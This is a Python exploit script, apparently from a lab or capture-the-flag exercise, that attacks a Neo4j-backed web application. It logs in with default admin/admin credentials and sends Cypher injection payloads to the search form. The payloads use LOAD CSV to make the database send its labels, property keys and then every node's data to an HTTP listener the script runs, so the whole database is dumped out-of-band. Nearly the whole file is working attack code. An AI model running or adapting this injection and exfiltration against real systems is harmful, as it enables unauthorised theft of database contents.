import threading
import requests
import argparse
import queue
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from loguru import logger

class ReqHandler(BaseHTTPRequestHandler):

    msgs = queue.Queue()

    def do_GET(self):
        parameters = self.path.split('?', maxsplit=1)[1]
        parameters = parameters.replace("%20", " ")
        logger.info(parameters)
        self.msgs.put(parameters)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Connection", "close")
        self.end_headers()


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", type=str, default="http://127.0.0.1:8001")
    parser.add_argument("--proxy", type=str, default="http://127.0.0.1:8080")
    parser.add_argument("-p", "--port", type=str, default=8989)
    parser.add_argument("ip", type=str)
    parser.add_argument('--timeout', type=int, default=1)
    parser.add_argument('--output', type=str, default="neo4jdump.log")
    parser.add_argument('-v', '--verbose', action="store_true")

    args = parser.parse_args()
    log_level = "SUCCESS"
    if args.verbose:
        log_level = "DEBUG"

    # Setup logging
    logger.remove(0)
    logger.add(sys.stdout, level=log_level)
    logger.add(args.output, level=log_level)


    # Setup http server
    server = (args.ip, args.port)
    httpd  = HTTPServer(server, ReqHandler)
    httpd.allow_reuse_address = True
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.start()

    s = requests.session()

    # Try to login
    r = s.post(f'{args.url}/login', 
            data={"username": "admin", "password": "admin"},
            proxies={'http': args.proxy},
            allow_redirects=False)
    if "Location" not in r.headers or r.headers['Location'] != '/dashboard':
        logger.error("Failed to login")
        sys.exit(1)
    logger.success("Logged in")

    # Get labels 
    payload = {
        "search": 
            "Sarah' with 1337 as x "
            "CALL db.labels() YIELD label AS label "
            f"LOAD CSV FROM 'http://{args.ip}:{args.port}/?'+label as l RETURN 0 //"
    }
    logger.info(f"Enumearting labels...")
    logger.info(f"Sending payload: \n{payload}")
    r = s.post(f'{args.url}/search', data=payload, proxies={'http': args.proxy})

    # Count the nr of labels
    labels = {}
    done = False
    while not done:
        try:
            label = ReqHandler.msgs.get(timeout=args.timeout)
            labels[label] = set()
        except queue.Empty:
            done = True
            logger.info("Timeout")
    logger.success(f"Number of labels: {len(labels)}")
    logger.info(labels)

    # Get keys for each label
    for label in labels:
        logger.success(f"Enumerating label: {label}")
        payload = {
            "search": 
                "Sarah' with 1337 as x "
                f"MATCH (f:{label}) UNWIND keys(f) as p "
                f"LOAD CSV FROM 'http://{args.ip}:{args.port}/?'+p as l RETURN 1 //"
        }
        logger.info(f"Sending payload: \n{payload}")
        r = s.post(f'{args.url}/search', data=payload, proxies={'http': args.proxy})

        done = False
        while not done:
            try:
                key = ReqHandler.msgs.get(timeout=args.timeout)
                labels[label].add(key)
            except queue.Empty:
                done = True
                logger.info("Timeout")
        logger.success(f"Number of keys: {len(labels[label])}")
        for key in labels[label]:
            logger.success(f"{label}.{key}")

        # Dump DB for each label & key
        query = "+'&'+".join(f"replace(f.{x}, ' ', '%20')" for x in labels[label])
        logger.debug(f'Running query {query}')
        payload = {
            "search":
                "Sarah' with 1337 as x "
                f"MATCH (f:{label}) "
                f"LOAD CSV FROM 'http://{args.ip}:{args.port}/?'+{query} as l RETURN 1 //"
        }
        logger.debug(f"Sending payload: \n{payload}")
        r = s.post(f'{args.url}/search', data=payload, proxies={'http': args.proxy})
        done = False
        while not done:
            try:
                key = ReqHandler.msgs.get(timeout=args.timeout)
                logger.success(key)
            except queue.Empty:
                done = True
                logger.info("Timeout")

    httpd.shutdown()

